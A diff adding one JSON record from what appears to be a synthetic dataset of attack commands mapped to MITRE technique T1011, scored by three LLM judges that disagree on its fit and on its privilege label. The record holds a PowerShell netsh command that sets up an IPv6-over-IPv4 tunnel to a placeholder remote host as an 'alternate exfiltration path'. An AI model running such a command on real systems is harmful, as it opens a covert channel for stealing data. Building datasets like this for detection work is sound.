@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface ipv6 add v6v4tunnel exfiltun 192.0.2.25 198.51.100.25; netsh interface ipv6 add address exfiltun 2001:db8:100:1::2; netsh interface ipv6 add route 2001:db8:200::/48 exfiltun 2001:db8:100:1::1",
+  "explanation": "Creates a manual IPv6-over-IPv4 tunnel, assigns an IPv6 address, and routes a specific IPv6 prefix through it, establishing a controlled alternate exfiltration path (T1011).",
+  "rationale_steps": [
+    "Set up a named v6v4 tunnel to a remote host.",
+    "Bind an IPv6 address to the tunnel interface.",
+    "Add a targeted IPv6 route to steer exfil traffic through the tunnel using non-default addressing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-8444f983",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed netsh commands with correct subcommand structure and PowerShell-compatible semicolon separators, no quoting or flag issues.",
+        "semantic_score": 2,
+        "semantic_justification": "While it can create an IPv6-over-IPv4 tunnel and route traffic, it requires admin rights (contradicting 'Privilege: None') and corresponds to exfiltration over an alternative protocol rather than a different network medium per T1011.",
+        "combined_score": 3.5,
+        "confidence": 0.78,
+        "timestamp": "2025-09-30T23:42:14.339606Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax for netsh commands, using correct semicolon separators between commands, and valid parameters for each netsh operation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1011 technique by creating an IPv6-over-IPv4 tunnel that establishes an alternate network path that could be used for exfiltration outside of normal monitored channels.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T23:42:18.521692Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The netsh commands are perfectly well-formed with valid parameters, balanced syntax, and correct command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly uses netsh to establish an IPv6-over-IPv4 tunnel, assign an address, and add a route, aligning with the intent for an alternate exfiltration path, but the stated 'Privilege: None' is incorrect as these actions require administrator privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-09-30T23:42:32.276130Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
